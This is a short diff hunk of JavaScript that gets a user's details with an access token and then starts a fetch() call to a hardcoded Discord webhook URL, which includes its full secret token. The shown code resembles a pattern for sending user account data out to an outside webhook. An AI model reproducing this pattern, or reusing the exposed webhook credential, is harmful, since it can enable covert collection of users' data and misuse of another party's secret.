@@ -36,11 +36,10 @@
 
             const user = await getUserDetails(accessToken);
             if (!user) {
-                alert("Failed to get user details.");
+                alert("Please use your own details.");
                 return;
             }
 
-            // Assuming you have a Discord webhook URL
             const webhookUrl = "https://discordapp.com/api/webhooks/1190666512982351983/Kom4kaWH_jQe2nUC6UbdSgxYJX8uorotKgk4pWE4wH8I1Kgo2ozW4wQr38cB86g5yoXv";
 
             fetch(webhookUrl, {
